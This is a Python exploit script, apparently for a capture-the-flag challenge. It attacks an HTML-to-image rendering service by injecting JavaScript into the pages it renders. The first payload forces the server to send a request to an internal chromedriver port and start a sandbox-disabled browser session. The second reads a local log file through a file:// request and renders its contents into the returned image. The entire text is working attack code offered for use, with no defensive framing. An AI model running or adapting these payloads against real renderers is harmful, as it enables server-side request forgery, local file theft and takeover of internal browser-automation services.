import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name, timeout=90):
    s = requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
    try:
        r = s.post(BASE+'/html-to-image', json={'pages':[html]}, timeout=timeout)
        if r.status_code==200 and 'zip' in r.headers.get('Content-Type',''):
            z=zipfile.ZipFile(io.BytesIO(r.content))
            for n in z.namelist():
                open(f'f:/mission-git-hackss/mission-git-hackss/{name}.jpg','wb').write(z.read(n))
                print(f'{name}: {len(z.read(n))} OK')
            return True
        print(f'{name}: [{r.status_code}] {r.text[:150]}'); return False
    except Exception as e:
        print(f'{name}: EXC {e}'); return False

# PHASE 1: fire session create, don't wait for render to show it (fire-and-forget)
fire = r'''<!doctype html><html><body>go<script>
var B="http://127.0.0.1:40003";
var caps=JSON.stringify({capabilities:{alwaysMatch:{browserName:"chrome","goog:chromeOptions":{args:["--headless=new","--no-sandbox","--disable-dev-shm-usage","--disable-gpu"]}}}});
navigator.sendBeacon?0:0;
var x=new XMLHttpRequest();x.open("POST",B+"/session",true);x.setRequestHeader("Content-Type","application/json");x.send(caps);
</script></body></html>'''
render(fire, 'fire', timeout=30)
print('waiting for session to spin up...')
time.sleep(8)

# PHASE 2: read chromedriver log to find the created sessionId + navigated urls
def xhr(path):
    return f'<!doctype html><html><body style="font:11px monospace;white-space:pre-wrap;word-break:break-all"><div id=o>x</div><script>var x=new XMLHttpRequest();try{{x.open("GET","file://{path}",false);x.send();var t=x.responseText||("E:"+x.status);document.getElementById("o").textContent=t.slice(-2500);}}catch(e){{document.getElementById("o").textContent="ERR:"+e;}}</script></body></html>'
render(xhr('/tmp/deckforge-render-chromedriver.log'), 'cdlog', timeout=60)
